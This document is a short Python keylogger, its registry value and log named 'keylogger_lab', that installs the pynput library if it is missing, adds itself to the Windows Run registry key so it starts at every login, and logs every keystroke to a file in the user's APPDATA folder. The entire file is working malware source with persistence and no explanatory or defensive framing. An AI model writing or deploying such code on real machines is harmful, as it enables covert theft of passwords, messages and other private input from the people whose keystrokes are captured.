try:
    from pynput.keyboard import Key, Listener
except ModuleNotFoundError:
    from subprocess import call
    call('pip install pynput', shell=True)
    from pynput.keyboard import Key, Listener

import logging
import os
import winreg as wrg
import sys

registry_path = wrg.HKEY_CURRENT_USER
script_path = os.path.abspath(sys.argv[0])
key = wrg.OpenKey(wrg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, wrg.KEY_ALL_ACCESS)

try:
    wrg.QueryValueEx(key, "keylogger_lab")
except FileNotFoundError:
    wrg.SetValueEx(key, "keylogger_lab", 0, wrg.REG_SZ, script_path)

wrg.CloseKey(key)

log_path = os.path.join(os.environ.get('APPDATA', os.path.expanduser('~')), 'keylogger_lab.log')
logging.basicConfig(filename=log_path, level=logging.DEBUG)

def on_press(key):
    if (key == Key.space):
        logging.info(" ")
    elif (key == Key.enter or key == Key.esc):
        logging.info('\n')
    else:
        try:
            logging.info(key.char)
        except AttributeError:
            logging.info(key)

with Listener(on_press=on_press) as listener:
    listener.join()
